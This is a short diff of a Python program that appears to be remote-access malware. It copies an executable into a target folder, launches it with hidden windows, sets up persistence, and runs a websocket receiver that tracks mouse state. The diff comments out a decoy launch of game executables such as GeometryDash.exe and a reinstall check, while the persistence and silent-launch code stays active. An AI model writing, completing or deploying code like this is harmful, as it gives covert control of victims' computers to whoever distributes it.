@@ -27,7 +27,7 @@ os.makedirs(target_dir, exist_ok=True)
 
 if not os.path.exists(target_exe):
     shutil.copy2(exe_path, target_exe)
-    subprocess.run(
+    subprocess.Popen(
         [target_exe],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL
@@ -202,26 +202,26 @@ startupinfo.wShowWindow = subprocess.SW_HIDE
 
 creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
 
-geometry_exe = os.path.join(os.path.dirname(sys.executable), "uninstaller.exe")
-if not os.path.isfile(geometry_exe):
-    geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "uninstaller.exe")
-    if not os.path.isfile(geometry_exe):
-        geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "GeometryDash.exe")
-        if not os.path.isfile(geometry_exe):
-            geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "UltimateChickenHorse.exe")
-            if not os.path.isfile(geometry_exe):
-                geometry_exe = None
+# geometry_exe = os.path.join(os.path.dirname(sys.executable), "uninstaller.exe")
+# if not os.path.isfile(geometry_exe):
+#     geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "uninstaller.exe")
+#     if not os.path.isfile(geometry_exe):
+#         geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "GeometryDash.exe")
+#         if not os.path.isfile(geometry_exe):
+#             geometry_exe = os.path.join(os.path.dirname(sys.executable), "garbage", "UltimateChickenHorse.exe")
+#             if not os.path.isfile(geometry_exe):
+#                 geometry_exe = None
 
 
-if geometry_exe:
-    try:
-        subprocess.Popen(
-            [geometry_exe],
-            startupinfo=startupinfo,
-            creationflags=creationflags
-        )
-    except Exception:
-        print("Failed to launch uninstaller.exe")
+# if geometry_exe:
+#     try:
+#         subprocess.Popen(
+#             [geometry_exe],
+#             startupinfo=startupinfo,
+#             creationflags=creationflags
+#         )
+#     except Exception:
+#         print("Failed to launch uninstaller.exe")
 
 state = {
     "mouse": None,
@@ -234,7 +234,7 @@ state = {
 #     sleep(3)
 
 ensure_persistence()
-check_reinstall()
+# check_reinstall()
 
 async def receiver(ws):
     try:
